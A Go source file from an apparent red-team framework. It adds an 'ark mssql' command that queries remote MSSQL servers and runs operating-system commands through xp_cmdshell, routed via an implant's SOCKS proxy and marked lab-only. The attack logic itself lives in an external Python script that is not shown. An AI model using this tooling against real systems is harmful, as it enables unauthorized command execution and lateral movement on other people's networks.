package preimplant

import (
	"fmt"
)

const mssqlUsage = `ark mssql — operator-host MSSQL (impacket tds + SQLSHELL)

  ark mssql query --host H --user U --pass-file P [--windows] [--port 1433] --sql "SELECT SYSTEM_USER"
  ark mssql xp --host H --user U --pass-file P --windows --yes --cmd "whoami"

--windows = Windows auth (domain\\user). xp_cmdshell requires --yes.
Honors ARK_PROXY / ALL_PROXY (SOCKS5 via PySocks). Pass --host as the inner SQL IP
(the implant SOCKS target), not 127.0.0.1. Loopback is not proxied unless ARK_PROXY_LOCAL=1.
Password is --pass-file (mode 600); do not put the password on the process command line.

Needs the ARK checkout: scripts/host_mssql.py is not installed with ~/.local/bin/ark.
Set ARK_ROOT=/path/to/ARK if you are not running from the repo. Lab-only.
`

// RunMSSQL is host-side MSSQL query / xp_cmdshell.
func RunMSSQL(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("%s", mssqlUsage)
	}
	switch args[0] {
	case "help", "-h", "--help":
		fmt.Print(mssqlUsage)
		return nil
	case "query", "sql":
		return mssqlQuery(args[1:], false)
	case "xp", "xp_cmdshell":
		return mssqlQuery(args[1:], true)
	default:
		return fmt.Errorf("unknown mssql command %q\n%s", args[0], mssqlUsage)
	}
}

func mssqlQuery(args []string, xp bool) error {
	f, _ := ParseFlags(args)
	host := first(f, "host", "target")
	user := first(f, "user", "username")
	if host == "" || user == "" {
		return fmt.Errorf("%s", mssqlUsage)
	}
	passFile := first(f, "pass-file")
	pass, err := readSecret(f, "pass", "pass-file")
	if err != nil {
		return err
	}
	if pass == "" {
		return fmt.Errorf("--pass-file required")
	}
	port := first(f, "port")
	if port == "" {
		port = "1433"
	}
	domain := first(f, "domain")
	windows := flagBool(f, "windows", "windows-auth")
	script, err := findRepoScript("scripts/host_mssql.py")
	if err != nil {
		return err
	}
	action := "query"
	argv := []string{script, action, "--host", host, "--user", user, "--port", port}
	if domain != "" {
		argv = append(argv, "--domain", domain)
	}
	if windows {
		argv = append(argv, "--windows")
	}
	var extraEnv []string
	if passFile != "" {
		argv = append(argv, "--pass-file", passFile)
	} else {
		// --pass still hits ark argv; do not put it on python argv.
		extraEnv = append(extraEnv, "ARK_MSSQL_PASS="+pass)
	}
	if xp {
		argv[1] = "xp"
		if !flagBool(f, "yes") {
			return fmt.Errorf("xp_cmdshell requires --yes")
		}
		cmd := first(f, "cmd", "command")
		if cmd == "" {
			return fmt.Errorf("--cmd required")
		}
		argv = append(argv, "--yes", "--cmd", cmd)
	} else {
		sql := first(f, "sql", "query")
		if sql == "" {
			return fmt.Errorf("--sql required")
		}
		argv = append(argv, "--sql", sql)
	}
	printProxyHint()
	return runPythonWithEnv(argv, extraEnv)
}
